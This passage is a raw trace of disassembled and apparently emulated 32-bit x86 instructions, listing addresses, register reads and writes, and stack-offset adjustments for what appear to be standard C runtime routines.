ebp, regs_read: [30], regs_write: [30, 20] 0x4577a7: mov edi, edi, regs_read: [23], regs_write: [23] 0x4577a9: push ebp, regs_read: [30, 20], regs_write: [30] 0x4577aa: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP -0x78 and offset 0x8000 for stack size 0x10000 0x4577ba: mov dword ptr [eax], 0x16, regs_read: [19], regs_write: () 0x4577c9: push esi, regs_read: [30, 29], regs_write: [30] 0x4577ca: mov esi, dword ptr [ebp + 0xc], regs_read: [20], regs_write: [29] adjusting stack for ESP -0x7c and offset 0x800c for stack size 0x10000 0x4577d6: mov dword ptr [eax], 0x16, regs_read: [19], regs_write: () 0x4577ec: push dword ptr [ebp + 0x10], regs_read: [30, 20], regs_write: [30] 0x4577f7: mov ecx, dword ptr [ebp - 8], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x80 and offset 0x7ff8 for stack size 0x10000 0x457813: mov eax, esi, regs_read: [29], regs_write: [19] 0x457817: mov edx, esi, regs_read: [29], regs_write: [24] 0x457825: mov ecx, dword ptr [ebp - 0x10], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x80 and offset 0x7ff0 for stack size 0x10000 0x45782f: mov eax, edx, regs_read: [24], regs_write: [19] 0x457831: pop esi, regs_read: [30], regs_write: [30, 29] 0x457840: mov eax, ecx, regs_read: [22], regs_write: [19] 0x457843: mov edi, edi, regs_read: [23], regs_write: [23] 0x457845: push ebp, regs_read: [30, 20], regs_write: [30] 0x457846: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP -0x80 and offset 0x8000 for stack size 0x10000 0x45784f: push esi, regs_read: [30, 29], regs_write: [30] 0x45785d: mov dword ptr [eax], 0x16, regs_read: [19], regs_write: () 0x457868: mov eax, 0x7fffffff, regs_read: (), regs_write: [19] 0x457875: mov esi, 0x7fffffff, regs_read: (), regs_write: [29] 0x457884: mov dword ptr [eax], 0x16, regs_read: [19], regs_write: () 0x45788f: mov eax, esi, regs_read: [29], regs_write: [19] 0x457893: pop esi, regs_read: [30], regs_write: [30, 29] 0x457894: pop ebp, regs_read: [30], regs_write: [30, 20] 0x45789a: push 0, regs_read: [30], regs_write: [30] 0x45789c: push dword ptr [ebp + 0x10], regs_read: [30, 20], regs_write: [30] 0x45789f: push dword ptr [ebp + 0xc], regs_read: [30, 20], regs_write: [30] 0x4578a2: push dword ptr [ebp + 8], regs_read: [30, 20], regs_write: [30] 0x4578ad: pop esi, regs_read: [30], regs_write: [30, 29] 0x4578ae: pop ebp, regs_read: [30], regs_write: [30, 20] 0x4578b0: mov edi, edi, regs_read: [23], regs_write: [23] 0x4578b2: push ebp, regs_read: [30, 20], regs_write: [30] 0x4578b3: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP -0x88 and offset 0x8000 for stack size 0x10000 0x4578b8: push edi, regs_read: [30, 23], regs_write: [30] 0x4578b9: mov edi, dword ptr [ebp + 0x10], regs_read: [20], regs_write: [23] adjusting stack for ESP -0x8c and offset 0x8010 for stack size 0x10000 0x4578d2: mov dword ptr [eax], 0x16, regs_read: [19], regs_write: () 0x4578dd: mov eax, 0x7fffffff, regs_read: (), regs_write: [19] 0x4578ed: push esi, regs_read: [30, 29], regs_write: [30] 0x4578ee: mov esi, 0x7fffffff, regs_read: (), regs_write: [29] 0x4578fc: mov dword ptr [eax], 0x16, regs_read: [19], regs_write: () 0x457909: push dword ptr [ebp + 0x14], regs_read: [30, 20], regs_write: [30] 0x457914: mov eax, dword ptr [ebp - 0xc], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x94 and offset 0x7ff4 for stack size 0x10000 0x457917: push edi, regs_read: [30, 23], regs_write: [30] 0x457918: push dword ptr [ebp + 0xc], regs_read: [30, 20], regs_write: [30] 0x45791b: mov eax, dword ptr [eax + 0xa4], regs_read: [19], regs_write: [19] 0x457925: push dword ptr [ebp + 8], regs_read: [30, 20], regs_write: [30] 0x457930: mov esi, eax, regs_read: [19], regs_write: [29] 0x457934: push edi, regs_read: [30, 23], regs_write: [30] 0x457935: push dword ptr [ebp + 8], regs_read: [30, 20], regs_write: [30] 0x457938: push 0x1001, regs_read: [30], regs_write: [30] 0x45793d: push eax, regs_read: [30, 19], regs_write: [30] 0x45794f: mov dword ptr [eax], 0x16, regs_read: [19], regs_write: () 0x457960: mov ecx, dword ptr [ebp - 0x10], regs_read: [20], regs_write: [22] adjusting stack for ESP -0xb0 and offset 0x7ff0 for stack size 0x10000 0x45796a: mov eax, esi, regs_read: [29], regs_write: [19] 0x45796c: pop esi, regs_read: [30], regs_write: [30, 29] 0x45796d: pop edi, regs_read: [30], regs_write: [30, 23] 0x457970: mov edi, edi, regs_read: [23], regs_write: [23] 0x457972: push ebp, regs_read: [30, 20], regs_write: [30] 0x457973: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP -0xac and offset 0x8000 for stack size 0x10000 0x457980: mov dword ptr [eax], 0x16, regs_read: [19], regs_write: () 0x45798e: pop ebp, regs_read: [30], regs_write: [30, 20] 0x457990: push dword ptr [ebp + 8], regs_read: [30, 20], regs_write: [30] 0x457993: push 0, regs_read: [30], regs_write: [30] 0x457995: push dword ptr [0x4f04cc], regs_read: [30], regs_write: [30] 0x4579a1: pop ebp, regs_read: [30], regs_write: [30, 20] 0x4579a3: mov edi, edi, regs_read: [23], regs_write: [23] 0x4579a5: push ebp, regs_read: [30, 20], regs_write: [30] 0x4579a6: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP -0xb4 and offset 0x8000 for stack size 0x10000 0x4579ab: mov eax, dword ptr [ebp + 0xc], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xb4 and offset 0x800c for stack size 0x10000 0x4579b0: push ebx, regs_read: [30, 21], regs_write: [30] 0x4579b1: mov ebx, dword ptr [ebp + 8], regs_read: [20], regs_write: [21] adjusting stack for ESP -0xb8 and offset 0x8008 for stack size 0x10000 0x4579b4: push esi, regs_read: [30, 29], regs_write: [30] 0x4579b5: mov esi, eax, regs_read: [19], regs_write: [29] 0x4579b7: mov dword ptr [ebp - 8], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0xbc and offset 0x7ff8 for stack size 0x10000 saving data to stack: 0 4 0x4579ba: push edi, regs_read: [30, 23], regs_write: [30] 0x4579bb: mov dword ptr [ebp - 4], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0xc0 and offset 0x7ffc for stack size 0x10000 saving data to stack: 0 4 0x4579c3: push 0x2d, regs_read: [30], regs_write: [30] 0x4579c5: pop ecx, regs_read: [30], regs_write: [30, 22] 0x4579c6: mov word ptr [eax], cx, regs_read: [19, 12], regs_write: () 0x4579ce: mov dword ptr [ebp - 8], esi, regs_read: [20, 29], regs_write: () adjusting stack for ESP -0xc0 and offset 0x7ff8 for stack size 0x10000 saving data to stack: 2147483647 4 0x4579d4: mov dword ptr [ebp - 4], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0xc0 and offset 0x7ffc for stack size 0x10000 saving data to stack: 0 4 0x4579d7: mov dword ptr [ebp - 0xc], esi, regs_read: [20, 29], regs_write: () adjusting stack for ESP -0xc0 and offset 0x7ff4 for stack size 0x10000 saving data to stack: 2147483647 4 0x4579da: mov esi, dword ptr [ebp - 8], regs_read: [20], regs_write: [29] adjusting stack for ESP -0xc0 and offset 0x7ff8 for stack size 0x10000 0x4579df: mov eax, ebx, regs_read: [21], regs_write: [19] 0x4579e4: mov eax, ebx, regs_read: [21], regs_write: [19] 0x4579e6: mov edi, esi, regs_read: [29], regs_write: [23] 0x4579e8: mov ecx, edx, regs_read: [24], regs_write: [22] 0x4579ef: push 9, regs_read: [30], regs_write: [30] 0x4579f1: mov ebx, eax, regs_read: [19], regs_write: [21] 0x4579f6: pop eax, regs_read: [30], regs_write: [30, 19] 0x457a04: mov ecx, dword ptr [ebp + 0x10], regs_read: [20], regs_write: [22] adjusting stack for ESP -0xc0 and offset 0x8010 for stack size 0x10000 0x457a07: mov word ptr [esi], ax, regs_read: [29, 3], regs_write: () 0x457a0a: mov eax, dword ptr [ebp - 4], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc0 and offset 0x7ffc for stack size 0x10000 0x457a0e: mov dword ptr [ebp - 4], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0xc0 and offset 0x7ffc for stack size 0x10000 saving data to stack: 0 4 0x457a15: mov esi, edx, regs_read: [24], regs_write: [29] 0x457a1b: mov esi, dword ptr [ebp - 0xc], regs_read: [20], regs_write: [29] adjusting stack for ESP -0xc0 and offset 0x7ff4 for stack size 0x10000 0x457a22: mov eax, dword ptr [ebp + 0xc], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc0 and offset 0x800c for stack size 0x10000 0x457a27: mov word ptr [eax], cx, regs_read: [19, 12], regs_write: () 0x457a2f: push 0x22, regs_read: [30], regs_write: [30] 0x457a31: pop esi, regs_read: [30], regs_write: [30, 29] 0x457a32: mov dword ptr [eax], esi, regs_read: [19, 29], regs_write: () 0x457a39: mov eax, esi, regs_read: [29], regs_write: [19] 0x457a3f: mov word ptr [edx], ax, regs_read: [24, 3], regs_write: () 0x457a42: mov ax, word ptr [esi], regs_read: [29], regs_write: [3] 0x457a48: mov word ptr [edi], ax, regs_read: [23, 3], regs_write: () 0x457a4e: mov word ptr [esi], cx, regs_read: [29, 12], regs_write: () 0x457a5a: pop edi, regs_read: [30], regs_write: [30, 23] 0x457a5b: pop esi, regs_read: [30], regs_write: [30, 29] 0x457a5c: pop ebx, regs_read: [30], regs_write: [30, 21] 0x457a5f: mov edi, edi, regs_read: [23], regs_write: [23] 0x457a61: push ebp, regs_read: [30, 20], regs_write: [30] 0x457a62: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP -0xb8 and offset 0x8000 for stack size 0x10000 0x457a64: mov ecx, dword ptr [ebp + 0xc], regs_read: [20], regs_write: [22] adjusting stack for ESP -0xb8 and offset 0x800c for stack size 0x10000 0x457a67: push esi, regs_read: [30, 29], regs_write: [30] 0x457a71: push 0x16, regs_read: [30], regs_write: [30] 0x457a73: pop esi, regs_read: [30], regs_write: [30, 29] 0x457a74: mov dword ptr [eax], esi, regs_read: [19, 29], regs_write: () 0x457a7b: mov eax, esi, regs_read: [29], regs_write: [19] 0x457a7f: mov edx, dword ptr [ebp + 0x10], regs_read: [20], regs_write: [24] adjusting stack for ESP -0xbc and offset 0x8010 for stack size 0x10000 0x457a82: push ebx, regs_read: [30, 21], regs_write: [30] 0x457a87: mov ebx, dword ptr [ebp + 0x18], regs_read: [20], regs_write: [21] adjusting stack for ESP -0xc0 and offset 0x8018 for stack size 0x10000 0x457a8c: mov word ptr [ecx], ax, regs_read: [22, 3], regs_write: () 0x457a9c: push 0x22, regs_read: [30], regs_write: [30] 0x457aa0: mov esi, dword ptr [ebp + 0x14], regs_read: [20], regs_write: [29] adjusting stack for ESP -0xc4 and offset 0x8014 for stack size 0x10000 0x457ab0: push 0x16, regs_read: [30], regs_write: [30] 0x457ab2: pop esi, regs_read: [30], regs_write: [30, 29] 0x457ab3: mov dword ptr [eax], esi, regs_read: [19, 29], regs_write: () 0x457aba: mov eax, esi, regs_read: [29], regs_write: [19] 0x457abe: push ebx, regs_read: [30, 21], regs_write: [30] 0x457abf: push esi, regs_read: [30, 29], regs_write: [30] 0x457ac0: push edx, regs_read: [30, 24], regs_write: [30] 0x457ac1: push ecx, regs_read: [30, 22], regs_write: [30] 0x457ac2: push dword ptr [ebp + 8], regs_read: [30, 20], regs_write: [30] 0x457acd: pop ebx, regs_read: [30], regs_write: [30, 21] 0x457ace: pop esi, regs_read: [30], regs_write: [30, 29] 0x457acf: pop ebp, regs_read: [30], regs_write: [30, 20] 0x457ad1: mov edi, edi, regs_read: [23], regs_write: [23] 0x457ad3: push ebp, regs_read: [30, 20], regs_write: [30] 0x457ad4: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP -0xd0 and offset 0x8000 for stack size 0x10000 0x457ad6: push ecx, regs_read: [30, 22], regs_write: [30] 0x457ae1: mov byte ptr [ebp - 4], 1, regs_read: [20], regs_write: () adjusting stack for ESP -0xd4 and offset 0x7ffc for stack size 0x10000 saving data to stack: 1 1 0x457ae7: mov byte ptr [ebp - 4], 0, regs_read: [20], regs_write: () adjusting stack for ESP -0xd4 and offset 0x7ffc for stack size 0x10000 saving data to stack: 0 1 0x457aeb: push dword ptr [ebp - 4], regs_read: [30, 20], regs_write: [30] 0x457aee: push dword ptr [ebp + 0x14], regs_read: [30, 20], regs_write: [30] 0x457af1: push dword ptr [ebp + 0x10], regs_read: [30, 20], regs_write: [30] 0x457af4: push dword ptr [ebp + 0xc], regs_read: [30, 20], regs_write: [30] 0x457af7: push dword ptr [ebp + 8], regs_read: [30, 20], regs_write: [30] 0x457b04: mov edi, edi, regs_read: [23], regs_write: [23] 0x457b06: push ebp, regs_read: [30, 20], regs_write: [30] 0x457b07: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP -0xec and offset 0x8000 for stack size 0x10000 0x457b0c: mov eax, dword ptr [0x4eb04c], regs_read: (), regs_write: [19] 0x457b13: mov dword ptr [ebp - 4], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0xec and offset 0x7ffc for stack size 0x10000 saving data to stack: 0 4 0x457b16: mov ecx, dword ptr [ebp + 8], regs_read: [20], regs_write: [22] adjusting stack for ESP -0xec and offset 0x8008 for stack size 0x10000 0x457b19: mov eax, dword ptr [ebp + 0xc], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xec and offset 0x800c for stack size 0x10000 0x457b1c: push ebx, regs_read: [30, 21], regs_write: [30] 0x457b1d: push esi, regs_read: [30, 29], regs_write: [30] 0x457b1e: mov esi, dword ptr [ebp + 0x14], regs_read: [20], regs_write: [29] adjusting stack for ESP -0xf4 and offset 0x8014 for stack size 0x10000 0x457b21: mov dword ptr [ebp - 0x18], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0xf4 and offset 0x7fe8 for stack size 0x10000 saving data to stack: 0 4 0x457b24: mov ecx, dword ptr [ebp + 0x18], regs_read: [20], regs_write: [22] adjusting stack for ESP -0xf4 and offset 0x8018 for stack size 0x10000 0x457b27: mov dword ptr [ebp - 0x20], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0xf4 and offset 0x7fe0 for stack size 0x10000 saving data to stack: 0 4 0x457b2a: mov dword ptr [ebp - 0x1c], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0xf4 and offset 0x7fe4 for stack size 0x10000 saving data to stack: 0 4 0x457b2d: push edi, regs_read: [30, 23], regs_write: [30] 0x457b32: mov esi, 0x4f04e0, regs_read: (), regs_write: [29] 0x457b40: mov eax, edx, regs_read: [24], regs_write: [19] 0x457b42: mov edi, 0x4e3683, regs_read: (), regs_write: [23] 0x457b47: mov dword ptr [ebp + 0x10], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0xf8 and offset 0x8010 for stack size 0x10000 saving data to stack: 0 4 0x457b4a: mov eax, ebx, regs_read: [21], regs_write: [19] 0x457b4c: mov dword ptr [ebp - 0x18], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0xf8 and offset 0x7fe8 for stack size 0x10000 saving data to stack: 0 4 0x457b51: mov edi, eax, regs_read: [19], regs_write: [23] 0x457b58: push -2, regs_read: [30], regs_write: [30] 0x457b5a: pop eax, regs_read: [30], regs_write: [30, 19] 0x457b60: mov eax, dword ptr [ebp - 0x18], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xf8 and offset 0x7fe8 for stack size 0x10000 0x457b69: mov bl, byte ptr [edi], regs_read: [23], regs_write: [5] 0x457b74: mov ecx, dword ptr [ebp - 0x18], regs_read: [20], regs_write: [22] adjusting stack for ESP -0xf8 and offset 0x7fe8 for stack size 0x10000 0x457b7a: mov dword ptr [ecx], eax, regs_read: [22, 19], regs_write: () 0x457b88: mov al, bl, regs_read: [5], regs_write: [2] 0x457b90: mov bh, 2, regs_read: (), regs_write: [4] 0x457b94: mov al, bl, regs_read: [5], regs_write: [2] 0x457b9c: mov bh, 3, regs_read: (), regs_write: [4] 0x457ba0: mov al, bl, regs_read: [5], regs_write: [2] 0x457bac: mov bh, 4, regs_read: (), regs_write: [4] 0x457bae: push 7, regs_read: [30], regs_write: [30] 0x457bb3: pop ecx, regs_read: [30], regs_write: [30, 22] 0x457bb6: mov byte ptr [ebp - 0x11], bh, regs_read: [20, 4], regs_write: () adjusting stack for ESP -0xf8 and offset 0x7fef for stack size 0x10000 saving data to stack: 4 1 0x457bc1: mov bl, bh, regs_read: [4], regs_write: [5] 0x457bc5: mov bh, byte ptr [esi + 4], regs_read: [29], regs_write: [4] 0x457bc8: mov bl, byte ptr [esi + 6], regs_read: [29], regs_write: [5] 0x457bcb: mov al, bh, regs_read: [4], regs_write: [2] 0x457bcd: mov edx, dword ptr [esi], regs_read: [29], regs_write: [24] 0x457bd1: mov byte ptr [ebp - 0x11], bl, regs_read: [20, 5], regs_write: () adjusting stack for ESP -0xf8 and offset 0x7fef for stack size 0x10000 saving data to stack: 0 1 0x457bed: mov ecx, dword ptr [ebp + 0x10], regs_read: [20], regs_write: [22] adjusting stack for ESP -0xf8 and offset 0x8010 for stack size 0x10000 0x457bf3: mov dword ptr [ebp - 0x24], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0xf8 and offset 0x7fdc for stack size 0x10000 saving data to stack: 0 4 0x457bfa: mov ecx, eax, regs_read: [19], regs_write: [22] 0x457bfc: mov eax, edi, regs_read: [23], regs_write: [19] 0x457c03: mov bl, byte ptr [edi], regs_read: [23], regs_write: [5] 0x457c07: mov byte ptr [ebp - 0x12], bl, regs_read: [20, 5], regs_write: () adjusting stack for ESP -0xf8 and offset 0x7fee for stack size 0x10000 saving data to stack: 0 1 0x457c0a: mov dword ptr [ebp - 0x20], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0xf8 and offset 0x7fe0 for stack size 0x10000 saving data to stack: 0 4 0x457c0d: mov ah, bl, regs_read: [5], regs_write: [1] 0x457c0f: mov bl, byte ptr [ebp - 0x11], regs_read: [20], regs_write: [5] adjusting stack for ESP -0xf8 and offset 0x7fef for stack size 0x10000 0x457c12: mov al, ah, regs_read: [1], regs_write: [2] 0x457c25: mov eax, dword ptr [ebp - 0x20], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xf8 and offset 0x7fe0 for stack size 0x10000 0x457c2c: mov edi, dword ptr [ebp - 0x24], regs_read: [20], regs_write: [23] adjusting stack for ESP -0xf8 and offset 0x7fdc for stack size 0x10000 0x457c38: mov word ptr [esi + 4], ax, regs_read: [29, 3], regs_write: () 0x457c3f: mov dword ptr [esi], edx, regs_read: [29, 24], regs_write: () 0x457c41: mov word ptr [esi + 6], ax, regs_read: [29, 3], regs_write: () 0x457c4a: push dword ptr [ebp - 0x1c], regs_read: [30, 20], regs_write: [30] 0x457c6a: mov dword ptr [ebp - 0x10], 0x80, regs_read: [20], regs_write: () adjusting stack for ESP -0xfc and offset 0x7ff0 for stack size 0x10000 saving data to stack: 128 4 0x457c71: mov dword ptr [ebp - 0xc], 0x800, regs_read: [20], regs_write: () adjusting stack for ESP -0xfc and offset 0x7ff4 for stack size 0x10000 saving data to stack: 2048 4 0x457c78: mov dword ptr [ebp - 8], 0x10000, regs_read: [20], regs_write: () adjusting stack for ESP -0xfc and offset 0x7ff8 for stack size 0x10000 saving data to stack: 65536 4 0x457c85: mov ecx, dword ptr [ebp - 0x18], regs_read: [20], regs_write: [22] adjusting stack for ESP -0xfc and offset 0x7fe8 for stack size 0x10000 0x457c8c: mov dword ptr [ecx], edx, regs_read: [22, 24], regs_write: () 0x457c90: push esi, regs_read: [30, 29], regs_write: [30] 0x457c95: push edx, regs_read: [30, 24], regs_write: [30] 0x457c9d: push ecx, regs_read: [30, 22], regs_write: [30] 0x457c9e: push esi, regs_read: [30, 29], regs_write: [30] 0x457ca4: pop ecx, regs_read: [30], regs_write: [30, 22] 0x457ca5: pop ecx, regs_read: [30], regs_write: [30, 22] 0x457ca6: mov ecx, dword ptr [ebp - 4], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x104 and offset 0x7ffc for stack size 0x10000 0x457ca9: pop edi, regs_read: [30], regs_write: [30, 23] 0x457caa: pop esi, regs_read: [30], regs_write: [30, 29] 0x457cad: pop ebx, regs_read: [30], regs_write: [30, 21] 0x457cb7: push eax, regs_read: [30, 19], regs_write: [30] 0x457cb8: push eax, regs_read: [30, 19], regs_write: [30] 0x457cb9: push 3, regs_read: [30], regs_write: [30] 0x457cbb: push eax, regs_read: [30, 19], regs_write: [30] 0x457cbc: push 3, regs_read: [30], regs_write: [30] 0x457cbe: push 0x40000000, regs_read: [30], regs_write: [30] 0x457cc3: push 0x4db7d0, regs_read: [30], regs_write: [30] 0x457cce: mov dword ptr [0x4ebb30], eax, regs_read: [19], regs_write: () 0x457cd4: mov ecx, dword ptr [0x4ebb30], regs_read: (), regs_write: [22] 0x457ce4: mov ecx, dword ptr [0x4ebb30], regs_read: (), regs_write: [22] 0x457cf3: mov eax, dword ptr [0x4ebb30], regs_read: (), regs_write: [19] 0x457d02: push eax, regs_read: [30, 19], regs_write: [30] 0x457d0a: mov edi, edi, regs_read: [23], regs_write: [23] 0x457d0c: push ebp, regs_read: [30, 20], regs_write: [30] 0x457d0d: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP -0x11c and offset 0x8000 for stack size 0x10000 0x457d0f: push esi, regs_read: [30, 29], regs_write: [30] 0x457d10: push 0, regs_read: [30], regs_write: [30] 0x457d12: push dword ptr [ebp + 0x10], regs_read: [30, 20], regs_write: [30] 0x457d15: push dword ptr [ebp + 0xc], regs_read: [30, 20], regs_write: [30] 0x457d18: push dword ptr [ebp + 8], regs_read: [30, 20], regs_write: [30] 0x457d1b: push dword ptr [0x4ebb30], regs_read: [30], regs_write: [30] 0x457d27: mov esi, eax, regs_read: [19], regs_write: [29] 0x457d42: push esi, regs_read: [30, 29], regs_write: [30] 0x457d43: push dword ptr [ebp + 0x10], regs_read: [30, 20], regs_write: [30] 0x457d46: push dword ptr [ebp + 0xc], regs_read: [30, 20], regs_write: [30] 0x457d49: push dword ptr [ebp + 8], regs_read: [30, 20], regs_write: [30] 0x457d4c: push dword ptr [0x4ebb30], regs_read: [30], regs_write: [30] 0x457d58: mov esi, eax, regs_read: [19], regs_write: [29] 0x457d5a: mov eax, esi, regs_read: [29], regs_write: [19] 0x457d5c: pop esi, regs_read: [30], regs_write: [30, 29] 0x457d5d: pop ebp, regs_read: [30], regs_write: [30, 20] 0x457d5f: mov edi, edi, regs_read: [23], regs_write: [23] 0x457d61: push ebp, regs_read: [30, 20], regs_write: [30] 0x457d62: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP -0x144 and offset 0x8000 for stack size 0x10000 0x457d64: push esi, regs_read: [30, 29], regs_write: [30] 0x457d6a: mov esi, dword ptr [ebp + 8], regs_read: [20], regs_write: [29] adjusting stack for ESP -0x148 and offset 0x8008 for stack size 0x10000 0x457d6d: mov dword ptr [esi], eax, regs_read: [29, 19], regs_write: () 0x457d74: mov dword ptr [esi + 4], eax, regs_read: [29, 19], regs_write: () 0x457d79: pop esi, regs_read: [30], regs_write: [30, 29] 0x457d7a: pop ebp, regs_read: [30], regs_write: [30, 20] 0x457d7c: mov edi, edi, regs_read: [23], regs_write: [23] 0x457d7e: push ebp, regs_read: [30, 20], regs_write: [30] 0x457d7f: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP -0x144 and offset 0x8000 for stack size 0x10000 0x457d81: push ecx, regs_read: [30, 22], regs_write: [30] 0x457d82: push ecx, regs_read: [30, 22], regs_write: [30] 0x457d83: push esi, regs_read: [30, 29], regs_write: [30] 0x457d84: mov esi, dword ptr [ebp + 8], regs_read: [20], regs_write: [29] adjusting stack for ESP -0x150 and offset 0x8008 for stack size 0x10000 0x457d87: push dword ptr [esi], regs_read: [30, 29], regs_write: [30] 0x457d8e: push dword ptr [esi + 4], regs_read: [30, 29], regs_write: [30] 0x457da1: push eax, regs_read: [30, 19], regs_write: [30] 0x457dae: mov eax, dword ptr [esi], regs_read: [29], regs_write: [19] 0x457db5: mov ecx, dword ptr [esi + 4], regs_read: [29], regs_write: [22] 0x457dc5: pop esi, regs_read: [30], regs_write: [30, 29] 0x457dc8: mov edi, edi, regs_read: [23], regs_write: [23] 0x457dca: push ebp, regs_read: [30, 20], regs_write: [30] 0x457dcb: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP -0x15c and offset 0x8000 for stack size 0x10000 0x457dcd: push ecx, regs_read: [30, 22], regs_write: [30] 0x457dce: push ecx, regs_read: [30, 22], regs_write: [30] 0x457dda: push eax, regs_read: [30, 19], regs_write: [30] 0x457de0: pop ecx, regs_read: [30], regs_write: [30, 22] 0x457de5: mov eax, dword ptr [ebp + 8], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x164 and offset 0x8008 for stack size 0x10000 0x457de8: mov edx, dword ptr [ebp - 8], regs_read: [20], regs_write: [24] adjusting stack for ESP -0x164 and offset 0x7ff8 for stack size 0x10000 0x457deb: mov ecx, dword ptr [ebp - 4], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x164 and offset 0x7ffc for stack size 0x10000 0x457dee: mov dword ptr [eax], edx, regs_read: [19, 24], regs_write: () 0x457df3: mov dword ptr [eax + 4], ecx, regs_read: [19, 22], regs_write: () 0x457df9: push eax, regs_read: [30, 19], regs_write: [30] 0x457dfa: mov dword ptr [ebp - 8], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0x168 and offset 0x7ff8 for stack size 0x10000 saving data to stack: 0 4 0x457e02: pop ecx, regs_read: [30], regs_write: [30, 22] 0x457e31: mov eax, dword ptr [esp + 4], regs_read: [30], regs_write: [19] adjusting stack for ESP -0x164 and offset 0x8004 for stack size 0x10000 0x457e44: mov ax, word ptr [esp], regs_read: [30], regs_write: [3] adjusting stack for ESP -0x164 and offset 0x8000 for stack size 0x10000 0x457e78: push edx, regs_read: [30, 24], regs_write: [30] 0x457e7f: mov eax, dword ptr [esp + 0xc], regs_read: [30], regs_write: [19] adjusting stack for ESP -0x168 and offset 0x800c for stack size 0x10000 0x457eb8: mov edx, 0x1b, regs_read: (), regs_write: [24] 0x457ee8: mov eax, 1, regs_read: (), regs_write: [19] 0x457f0c: mov eax, 2, regs_read: (), regs_write: [19] 0x457f24: mov edx, 0x1b, regs_read: (), regs_write: [24] 0x457f2e: pop edx, regs_read: [30], regs_write: [30, 24] 0x457f45: mov eax, dword ptr [esp + 4], regs_read: [30], regs_write: [19] adjusting stack for ESP -0x164 and offset 0x8004 for stack size 0x10000 0x457f58: mov ax, word ptr [esp], regs_read: [30], regs_write: [3] adjusting stack for ESP -0x164 and offset 0x8000 for stack size 0x10000 0x457fc9: mov edx, 0x3ec, regs_read: (), regs_write: [24] 0x457fd1: mov dword ptr [esp + 0xc], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP -0x164 and offset 0x800c for stack size 0x10000 saving data to stack: 1004 4 0x457fd5: mov edx, esp, regs_read: [30], regs_write: [24] adjusting stack for ESP -0x164 and offset 0x8000 for stack size 0x10000 0x457fda: mov dword ptr [esp + 8], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP -0x164 and offset 0x8008 for stack size 0x10000 saving data to stack: 0 4 0x457fde: mov dword ptr [esp + 4], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP -0x164 and offset 0x8004 for stack size 0x10000 saving data to stack: 0 4 0x457fe2: mov dword ptr [esp], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP -0x164 and offset 0x8000 for stack size 0x10000 saving data to stack: 0 4 0x45804d: mov edi, edi, regs_read: [23], regs_write: [23] 0x45804f: push ebp, regs_read: [30, 20], regs_write: [30] 0x458050: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP -0x168 and offset 0x8000 for stack size 0x10000 0x458052: mov eax, dword ptr [ebp + 0xc], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x168 and offset 0x800c for stack size 0x10000 0x45805c: mov eax, dword ptr [ebp + 8], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x168 and offset 0x8008 for stack size 0x10000 0x45805f: pop ebp, regs_read: [30], regs_write: [30, 20] 0x458061: mov edi, edi, regs_read: [23], regs_write: [23] 0x458063: push ebp, regs_read: [30, 20], regs_write: [30] 0x458064: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP -0x168 and offset 0x8000 for stack size 0x10000 0x458066: mov eax, dword ptr [ebp + 8], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x168 and offset 0x8008 for stack size 0x10000 0x458070: mov eax, dword ptr [ebp + 0xc], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x168 and offset 0x800c for stack size 0x10000 0x458073: mov byte ptr [eax + 0x1c], 1, regs_read: [19], regs_write: () 0x458077: mov dword ptr [eax + 0x18], 0x2a, regs_read: [19], regs_write: () 0x458081: pop ebp, regs_read: [30], regs_write: [30, 20] 0x458083: mov edi, edi, regs_read: [23], regs_write: [23] 0x458085: push ebp, regs_read: [30, 20], regs_write: [30] 0x458086: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP -0x168 and offset 0x8000 for stack size 0x10000 0x458088: push esi, regs_read: [30, 29], regs_write: [30] 0x458089: mov esi, dword ptr [ebp + 0x14], regs_read: [20], regs_write: [29] adjusting stack for ESP -0x16c and offset 0x8014 for stack size 0x10000 0x458090: push esi, regs_read: [30, 29], regs_write: [30] 0x458091: push dword ptr [ebp + 0x10], 